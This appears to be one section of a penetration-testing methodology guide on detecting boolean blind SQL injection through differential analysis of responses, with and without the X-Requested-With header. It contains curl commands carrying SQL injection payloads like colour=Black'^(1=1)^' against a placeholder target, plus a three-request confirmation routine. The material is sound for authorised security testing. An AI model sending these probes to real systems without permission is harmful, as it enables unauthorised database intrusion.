# PART 3: Boolean Blind SQLi Differential Detection

### 3.1 Why X-Requested-With Matters

Many web frameworks return different responses based on whether the request is an AJAX call:

| Header Present | Server Behavior | Response |
|----------------|----------------|----------|
| No `X-Requested-With` | Full HTML page (SPA shell, layout, nav, footer) | 180KB+ |
| `X-Requested-With: XMLHttpRequest` | HTML fragment or JSON (just the content) | 2-50KB |

**Critical consequence for blind SQLi**: A 2-byte difference in a 180KB response is invisible noise. The SAME 2-byte difference in a 2KB response may be a clear "10 Cars found" vs "4 Cars found" vs empty.

```bash
# ALWAYS test both with and without X-Requested-With
curl -sk "https://TARGET/endpoint" -o response_normal.html
curl -sk "https://TARGET/endpoint" -H "X-Requested-With: XMLHttpRequest" -o response_xhr.html

# Compare sizes
wc -c response_normal.html response_xhr.html
# If XHR response is significantly smaller, it's an AJAX endpoint
```

### 3.2 How to Detect AJAX Endpoints

```bash
# 1. Response size differential (XHR vs normal)
# If normal=180KB and XHR=5KB, the endpoint is AJAX-aware

# 2. Check for these response headers
curl -sI "https://TARGET/endpoint" -H "X-Requested-With: XMLHttpRequest" | grep -iE "content-type|x-requested"
# AJAX responses often return: application/json, text/html (fragment), text/plain

# 3. Check for jQuery AJAX detection patterns in PHP
# PHP checks: $_SERVER['HTTP_X_REQUESTED_WITH'] == 'XMLHttpRequest'
# WordPress: wp_doing_ajax(), check_ajax_referer()
# Laravel: $request->ajax(), $request->wantsJson()

# 4. Response content inspection
# Full page: contains <html>, <head>, <body>, navigation, footer
# AJAX fragment: contains only the content div, JSON, or partial HTML

# 5. Content-Type header on POST
# POST with form-data but NO X-Requested-With = form submit (redirect, full page)
# POST with form-data AND X-Requested-With = AJAX (fragment response)
```

### 3.3 Size-Based vs Content-Based Differential Detection

#### Size-Based (UNRELIABLE on full pages, RELIABLE on AJAX fragments)

```bash
# WRONG approach (full page -- what we did):
curl -sk -d "colour=Black" "https://TARGET/page" -o /dev/null -w "%{size_download}"
# Returns 180984 vs 180982 → 2 byte diff → "random fluctuation" → MISS

# RIGHT approach (AJAX fragment):
curl -sk -d "colour=Black" -H "X-Requested-With: XMLHttpRequest" "https://TARGET/page" -o /dev/null -w "%{size_download}"
# Returns 3842 vs 1205 → 2637 byte diff → CLEAR DIFFERENTIAL
```

#### Content-Based (ALWAYS MORE RELIABLE)

```bash
# Extract the actual content, not just size
TRUE_RESP=$(curl -sk -d "colour=Black'^(1=1)^'" -H "X-Requested-With: XMLHttpRequest" "https://TARGET/page")
FALSE_RESP=$(curl -sk -d "colour=Black'^(1=2)^'" -H "X-Requested-With: XMLHttpRequest" "https://TARGET/page")

# Compare
diff <(echo "$TRUE_RESP") <(echo "$FALSE_RESP")

# Look for specific content markers
echo "$TRUE_RESP" | grep -oP '\d+ Cars? found'
echo "$FALSE_RESP" | grep -oP '\d+ Cars? found'

# Hash comparison
echo "$TRUE_RESP" | md5sum
echo "$FALSE_RESP" | md5sum
```

#### Baseline Calibration (MANDATORY)

Before declaring any differential as SQLi, establish noise baseline:

```bash
# Send the SAME request 5 times -- measure variation
for i in $(seq 1 5); do
  curl -sk -d "colour=Black" -H "X-Requested-With: XMLHttpRequest" "https://TARGET/page" -o /dev/null -w "%{size_download}\n"
done

# If sizes vary by 0-2 bytes: noise. True SQLi differential should be >> noise.
# If sizes are identical every time: any size change = real signal.
```

### 3.4 The 3-Request Confirmation Protocol

Never conclude from a single request pair. Use three-request confirmation:

```bash
# Request 1: Known TRUE condition
curl -sk -d "colour=Black'^(1=1)^'" -H "X-Requested-With: XMLHttpRequest" "https://TARGET/page" -o true1.html

# Request 2: Known FALSE condition
curl -sk -d "colour=Black'^(1=2)^'" -H "X-Requested-With: XMLHttpRequest" "https://TARGET/page" -o false1.html

# Request 3: Second TRUE condition (must match Request 1)
curl -sk -d "colour=Black'^(2=2)^'" -H "X-Requested-With: XMLHttpRequest" "https://TARGET/page" -o true2.html

# Verification:
# true1 MUST equal true2 (same content/size)
# true1 MUST differ from false1
# If both conditions met: CONFIRMED boolean blind SQLi
md5sum true1.html true2.html false1.html
wc -c true1.html true2.html false1.html
```

---

